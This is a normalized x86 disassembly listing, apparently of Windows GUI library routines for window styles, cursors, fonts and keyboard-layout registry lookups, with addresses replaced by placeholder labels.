mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
test eax eax
je r-xdata
xor eax eax
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al 0x1
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2f0 ]
mov edx esi
call sub_418cf8
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
call sub_45ad9c
test al al
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_46b670
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x9 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c2 ] 0x0
je r-xdata
cmp [ ebp - 0x9 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x9 ]
mov edx [ ebp - 0x8 ]
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x2c4 ]
call [ ebx + 0x2c0 ]
mov al 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x248 ]
test ebx ebx
je r-xdata
push ebp
call sub_46b61c
pop ecx
test al al
jne r-xdata
cmp [ ebx + 0x38 ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax ebx
mov si 0xffef
call sub_403518
test al al
jne r-xdata
mov [ ebp - 0x9 ] al
mov al [ ebp - 0x9 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_46b6ec
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x250 ] 0x0
je r-xdata
push edi
push esi
push ebx
call sub_42220c
jmp r-xdata
push edi
push esi
mov eax [ ebx + 0x250 ]
push eax
mov eax [ eax ]
call [ eax ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
xor eax eax
sub_46b728
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x224 ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_44ed98
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx 0xb043
mov eax edi
call sub_44fa80
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_46b770
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax ebx
call sub_4553b8
test al al
je r-xdata
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call GetWindowLongA
mov esi eax
cmp [ ebx + 0x2e0 ] 0x0
jne r-xdata
test esi 0x80000
jne r-xdata
cmp [ ebx + 0x2e8 ] 0x0
je r-xdata
xor eax eax
mov al [ ebx + 0x2e0 ]
mov eax [ eax * 4 + rw-data ]
xor edx edx
mov dl [ ebx + 0x2e8 ]
or eax [ edx * 4 + rw-data ]
push eax
mov al [ ebx + 0x2e1 ]
push eax
mov eax [ ebx + 0x2ec ]
push eax
mov eax ebx
call sub_4550b4
push eax
call [ rw-data ]
jmp r-xdata
or esi 0x80000
push esi
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call SetWindowLongA
and esi 0xfff7ffff
push esi
push 0xffffffec
mov eax ebx
call sub_4550b4
push eax
call SetWindowLongA
push 0x485
push 0x0
push 0x0
mov eax ebx
call sub_4550b4
push eax
call RedrawWindow
sub_46b8c4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
push 0x0
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe0 ]
xor edx edx
mov eax ebx
call sub_466674
mov dl 0x5
mov eax ebx
call sub_4683e8
mov dl 0x1
mov eax ebx
call sub_453c90
mov dl 0x3
mov eax ebx
call sub_4686e4
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_46b92c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_46ba03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_453b50
dec eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4539bc
mov dl 0x5
mov eax [ ebp - 0x4 ]
call sub_44ddc8
test [ esi + 0x1c ] 0x1
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44e828
mov ecx eax
inc ecx
lea eax [ ebp - 0xc ]
xor edx edx
call sub_404208
mov eax [ ebp - 0xc ]
call sub_4043d8
push eax
mov eax [ ebp - 0xc ]
call sub_4045d8
mov edx eax
mov eax [ ebp - 0x4 ]
pop ecx
call sub_44e838
mov eax [ ebp - 0xc ]
call sub_4043d8
test eax eax
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ba0a
lea eax [ ebp - 0xc ]
call sub_404118
retn
mov dl 0x1
mov eax esi
call sub_467a68
mov edx [ ebp - 0xc ]
mov eax esi
call sub_44e8e4
mov ebx 0x1
mov edx ebx
dec edx
lea eax [ ebp - 0xc ]
call sub_404764
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0xc ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46ba30
push ebx
push esi
push edi
push ebp
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_451de4
mov edi eax
dec edi
test edi edi
jl r-xdata
mov eax ebx
call sub_46718c
add esp 0x10
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
xor ebp ebp
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
push esp
mov edx ebp
mov eax ebx
call sub_451da8
mov edx ebx
pop ecx
mov si 0xffcc
call sub_403518
inc ebp
dec edi
jne r-xdata
sub_46ba7c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x8 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax ebx
call sub_453b50
test eax eax
mov eax [ ebp + 0x8 ]
sete [ eax ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
sub_46baa8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_454358
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0xc ] 0x1
jne r-xdata
mov [ esi + 0xc ] 0x2
sub_46bad0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ esi + 0x4 ] 0x2
jne r-xdata
mov edx esi
mov eax ebx
call sub_469e38
cmp [ ebx + 0x9b ] 0x1
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax ebx
call sub_4550b4
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax ebx
call sub_453b50
test eax eax
jle r-xdata
push 0x7
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4550b4
push eax
call SetWindowPos
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
push 0xa2
mov eax ebx
call sub_4550b4
push eax
call PostMessageA
cmp [ ebx + 0x22e ] 0x0
je r-xdata
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_453b64
or ecx 0xffffffff
mov dl 0x1
call sub_44ef74
pop esi
pop ebx
retn
sub_46bb68
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_4547c8
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x4 ]
push eax
xor ecx ecx
mov edx 0xb039
mov eax esi
call sub_44fa80
mov edi [ ebx + 0x4 ]
cmp esi [ edi + 0xa0 ]
jne r-xdata
mov edx esp
mov eax edi
call sub_44e254
mov ecx esp
mov eax edi
or edx 0xffffffff
mov si 0xffcc
call sub_403518
sub_46bbc0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_46bc86
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
sub eax 0xc
je r-xdata
mov eax [ ebx + 0x4 ]
call sub_44e828
mov ecx eax
inc ecx
lea eax [ ebp - 0x4 ]
xor edx edx
call sub_404208
mov eax [ ebp - 0x4 ]
call sub_4043d8
push eax
mov eax [ ebp - 0x4 ]
call sub_4045d8
mov edx eax
mov eax [ ebx + 0x4 ]
pop ecx
call sub_44e838
mov eax [ ebp - 0x4 ]
call sub_4043d8
test eax eax
jle r-xdata
sub eax 0xafff
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_44e8e4
mov ebx 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46bc8d
lea eax [ ebp - 0x4 ]
call sub_404118
retn
mov eax [ ebx + 0x4 ]
mov dl [ eax + 0x57 ]
mov eax esi
call sub_467a68
jmp r-xdata
mov edx ebx
dec edx
lea eax [ ebp - 0x4 ]
call sub_404764
jmp r-xdata
sub dl 0x3
jne r-xdata
inc ebx
dec eax
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + ebx - 0x1 ]
sub dl 0xa
je r-xdata
sub_46bcac
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_454548
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_453b50
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_453b64
mov dl [ ebx + 0x57 ]
call sub_44e7d4
inc edi
dec esi
jne r-xdata
sub_46bd50
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46bd80
push ebx
push esi
push edi
add esp 0xffffffd8
mov ebx edx
mov [ esp ] 0x28
push esp
mov eax [ eax + 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edi ebx
lea esi [ esp + 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x28
pop edi
pop esi
pop ebx
retn
sub_46bdb0
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_421a7c
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46c154
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov [ eax ] sub_46c160
mov eax ebx
call sub_46c16c
push 0x0
call GetKeyboardLayout
mov [ ebx + 0x3c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x4c ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x54 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x58 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov [ ebx + 0x7c ] eax
push 0x0
call GetDC
mov esi eax
push 0x5a
push esi
call GetDeviceCaps
mov [ ebx + 0x40 ] eax
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x58 ]
push eax
mov eax sub_468588
push eax
push 0x0
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42492c
mov [ ebx + 0x84 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42492c
mov [ ebx + 0x88 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42492c
mov [ ebx + 0x80 ] eax
mov eax ebx
call sub_46c58c
mov eax [ ebx + 0x84 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46c468
mov eax [ ebx + 0x88 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46c468
mov eax [ ebx + 0x80 ]
mov [ eax + 0xc ] ebx
mov [ eax + 0x8 ] sub_46c468
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403668
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4036c0
pop [ fs : 0x0 ]
add esp 0xc
sub_46bf08
push ebx
push esi
push edi
push ebp
call sub_4036d0
mov ebx edx
mov ebp eax
mov eax [ ebp + 0x80 ]
call sub_40331c
mov eax [ ebp + 0x88 ]
call sub_40331c
mov eax [ ebp + 0x84 ]
call sub_40331c
mov eax [ ebp + 0x54 ]
call sub_40331c
mov eax [ ebp + 0x50 ]
call sub_40331c
mov eax [ ebp + 0x4c ]
call sub_40331c
mov eax [ ebp + 0x30 ]
call sub_40331c
mov eax [ ebp + 0x34 ]
call sub_40331c
mov eax [ ebp + 0x7c ]
call sub_40331c
mov eax [ ebp + 0x58 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x58 ]
call sub_40331c
mov eax ebp
call sub_46c1c8
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov [ eax + 0x4 ] edx
mov edx ebx
and dl 0xfc
mov eax ebp
call sub_421ac8
test bl bl
jle r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_4036b8
inc esi
xor edi edi
mov eax [ ebp + 0x58 ]
mov edx edi
call sub_418cf8
call sub_40331c
inc edi
dec esi
jne r-xdata
sub_46c080
push ebx
mov ebx eax
mov eax [ ebx + 0x68 ]
cmp eax [ ebx + 0x74 ]
je r-xdata
mov eax [ ebx + 0x64 ]
cmp eax [ ebx + 0x70 ]
je r-xdata
mov [ ebx + 0x74 ] eax
cmp [ ebx + 0x9a ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x70 ] eax
cmp [ ebx + 0x92 ] 0x0
je r-xdata
mov edx ebx
mov eax [ ebx + 0x9c ]
call [ ebx + 0x98 ]
mov edx ebx
mov eax [ ebx + 0x94 ]
call [ ebx + 0x90 ]
sub_46c0cc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418b9c
mov eax esi
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418b9c
mov eax [ rw-data ]
call sub_46ee58
sub_46c104
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x50 ]
call sub_418e94
mov edx esi
mov eax [ ebx + 0x4c ]
call sub_418e94
mov eax [ rw-data ]
call sub_46ee58
mov eax [ ebx + 0x50 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax [ rw-data ]
cmp [ eax + 0x84 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x84 ]
call sub_45668c
sub_46c16c
push ebx
push esi
push edi
push ebp
mov ebp eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebp + 0x60 ] eax
mov ebx 0xffffffea
mov esi rw-data
cmp ebx 0xffffffeb
jne r-xdata
cmp ebx 0xfffffff4
jle r-xdata
xor edi edi
mov edi [ rw-data ]
jmp r-xdata
cmp ebx 0xffffffef
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esi ]
push eax
push edi
call LoadCursorA
mov ecx eax
mov edx ebx
mov eax ebp
call sub_46c224
inc ebx
add esi 0x4
cmp ebx 0xffffffff
jne r-xdata
sub_46c1c8
push ebx
push esi
push edi
mov edi eax
mov ebx [ edi + 0x5c ]
test ebx ebx
je r-xdata
push 0x7f00
push 0x0
call LoadCursorA
mov edx [ edi + 0x60 ]
cmp eax edx
je r-xdata
mov eax [ ebx + 0x4 ]
cmp eax 0xffffffef
jl r-xdata
pop edi
pop esi
pop ebx
retn
push edx
call DestroyCursor
cmp eax 0xffffffeb
je r-xdata
cmp eax 0xfffffff4
jle r-xdata
mov eax [ ebx + 0x8 ]
push eax
call DestroyCursor
test eax eax
jle r-xdata
mov esi [ ebx ]
mov edx 0xc
mov eax ebx
call sub_40270c
mov ebx esi
test ebx ebx
jne r-xdata
sub_46c224
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax 0xc
call sub_4026ec
mov edx [ ebx + 0x5c ]
mov [ eax ] edx
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] edi
mov [ ebx + 0x5c ] eax
pop edi
pop esi
pop ebx
retn
sub_46c24c
push ebp
mov ebp esp
add esp 0xfffffda0
push ebx
xor edx edx
mov [ ebp - 0x260 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46c3f7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x34 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x34 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c3fe
lea eax [ ebp - 0x260 ]
call sub_404118
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4032ec
mov edx [ ebp - 0x4 ]
mov [ edx + 0x34 ] eax
mov eax [ ebp - 0x4 ]
add eax 0x38
call sub_404118
lea eax [ ebp - 0x114 ]
push eax
push 0x40
call GetKeyboardLayoutList
dec eax
test eax eax
jl r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x1d ] 0x0
mov dl 0x1
call sub_41b444
inc eax
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x114 ]
mov [ ebp - 0x14 ] eax
add [ ebp - 0x14 ] 0x4
dec [ ebp - 0x10 ]
jne r-xdata
lea eax [ ebp - 0xc ]
push eax
push 0x20019
push 0x0
push 0x0
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov [ ebp - 0x25c ] eax
mov [ ebp - 0x258 ] 0x0
lea ecx [ ebp - 0x25c ]
mov edx r-xdata
lea eax [ ebp - 0x254 ]
call sub_409200
push eax
push 0x80000002
call RegOpenKeyExA
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
call sub_459e34
test al al
je r-xdata
xor eax eax
push ebp
push sub_46c3b3
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x8 ] 0x100
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x214 ]
push eax
push 0x0
push 0x0
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegQueryValueExA
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
call RegCloseKey
retn
lea eax [ ebp - 0x260 ]
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404388
mov edx [ ebp - 0x260 ]
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
cmp eax [ edx + 0x3c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
add eax 0x38
lea edx [ ebp - 0x214 ]
mov ecx 0x100
call sub_404388
sub_46c468
push ebx
push esi
mov esi edx
mov ebx eax
mov dx 0xb035
mov eax [ rw-data ]
call sub_46ecc8
cmp esi [ ebx + 0x80 ]
jne r-xdata
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46ea7c
mov dl 0x1
mov eax [ rw-data ]
call sub_46ea7c
sub_46c4d4
xor ecx ecx
cmp edx 0xffffffff
je r-xdata
mov eax ecx
retn
mov ecx [ eax + 0x5c ]
jmp r-xdata
test ecx ecx
je r-xdata
test ecx ecx
jne r-xdata
cmp edx [ ecx + 0x4 ]
jne r-xdata
mov ecx [ ecx + 0x8 ]
mov ecx [ eax + 0x60 ]
jmp r-xdata
mov ecx [ ecx ]
sub_46c4fc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov esi edx
mov ebx eax
cmp si [ ebx + 0x44 ]
je r-xdata
inc [ ebx + 0x48 ]
mov [ ebx + 0x44 ] si
test si si
jne r-xdata
movsx edx si
mov eax ebx
call sub_46c4d4
push eax
call SetCursor
push esp
call GetCursorPos
push [ esp + 0x4 ]
push [ esp + 0x4 ]
call WindowFromPoint
mov edi eax
test edi edi
je r-xdata
push 0x0
push edi
call __imp_GetWindowThreadProcessId
mov ebp eax
call GetCurrentThreadId
cmp ebp eax
jne r-xdata
mov eax esp
call sub_406e64
push eax
push 0x0
push 0x84
push edi
call SendMessageA
mov ebx eax
mov dx 0x200
mov eax ebx
call sub_406de0
push eax
push edi
push 0x20
push edi
call SendMessageA
jmp r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_46c58c
push ebp
mov ebp esp
add esp 0xfffffe6c
push ebx
mov ebx eax
mov [ ebp - 0x1 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_46c6d1
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov al [ eax + 0x88 ]
mov [ ebp - 0x1 ] al
push 0x0
lea eax [ ebp - 0x3d ]
push eax
push 0x3c
push 0x1f
call SystemParametersInfoA
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_46ea7c
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424cbc
lea eax [ ebp - 0x3d ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x84 ]
call sub_424cbc
jmp r-xdata
mov eax [ ebx + 0x80 ]
mov edx 0x8
call sub_424da0
push 0xd
call GetStockObject
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424cbc
lea eax [ ebp - 0xb5 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x80 ]
call sub_424cbc
lea eax [ ebp - 0xf1 ]
push eax
call CreateFontIndirectA
mov edx eax
mov eax [ ebx + 0x88 ]
call sub_424cbc
jmp r-xdata
mov [ ebp - 0x191 ] 0x154
push 0x0
lea eax [ ebp - 0x191 ]
push eax
push 0x0
push 0x29
call SystemParametersInfoA
test eax eax
je r-xdata
retn
mov dl [ ebp - 0x1 ]
mov eax [ rw-data ]
call sub_46ea7c
mov eax [ ebx + 0x80 ]
mov edx 0xff000017
call sub_424b00
mov eax [ ebx + 0x88 ]
mov edx 0xff000007
call sub_424b00
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46c6d8
cmp [ rw-data ] 0x0
je r-xdata
sub_46c710
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x1 ] cl
xor ecx ecx
mov bl [ ebp - 0x1 ]
dec bl
je r-xdata
mov edx [ edx + 0x44 ]
cmp edx [ eax + 0x44 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov eax ecx
pop ebx
pop ecx
pop ebp
retn
mov ecx [ edx + 0x44 ]
add ecx [ edx + 0x4c ]
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp ecx edx
setl cl
jmp r-xdata
dec bl
je r-xdata
mov edx [ edx + 0x40 ]
cmp edx [ eax + 0x40 ]
setg cl
jmp r-xdata
dec bl
je r-xdata
mov ecx [ edx + 0x40 ]
add ecx [ edx + 0x48 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp ecx edx
setl cl
jmp r-xdata
sub_46c770
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x1 ] dl
mov ebx eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
mov esi [ esi + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub esi [ eax ]
test esi esi
jl r-xdata
mov esi [ ebx + 0x48 ]
mov al [ ebp - 0x1 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebx + 0x4c ]
mov [ ebp - 0x10 ] eax
mov al [ ebp - 0x1 ]
dec eax
sub al 0x2
jae r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub eax [ edx + 0x4 ]
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
cmp [ ebp - 0x1 ] 0x1
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
add [ eax + 0x4 ] edx
jmp r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0xc ] eax
push 0x3d
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov esi eax
jmp r-xdata
push esi
mov eax [ ebp - 0x10 ]
push eax
mov ecx [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0x84 ]
cmp [ ebx + 0x22b ] 0x2
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ ebp - 0x10 ]
sub [ eax + 0xc ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xc ]
mov [ ebp - 0xc ] eax
jmp r-xdata
dec al
je r-xdata
mov al [ ebp - 0x1 ]
dec al
je r-xdata
mov eax [ ebx + 0x48 ]
cmp esi eax
jne r-xdata
sub esi [ ebp - 0x8 ]
mov eax [ ebp - 0xc ]
sub [ ebp - 0x10 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax ] esi
jmp r-xdata
dec al
je r-xdata
xor edx edx
mov dl [ ebp - 0x1 ]
cmp edx 0x5
ja r-xdata
mov edx [ ebx + 0x4c ]
cmp edx [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax + 0x8 ] esi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp [ edx * 4 + jump_table_46c8ac ]
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
sub [ edx + 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
sub [ eax ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
jmp r-xdata
sub esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
add [ eax + 0x8 ] esi
mov eax [ ebp - 0x10 ]
sub eax [ ebx + 0x4c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
add [ edx + 0xc ] eax
sub_46c920
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_46c078
mov edi eax
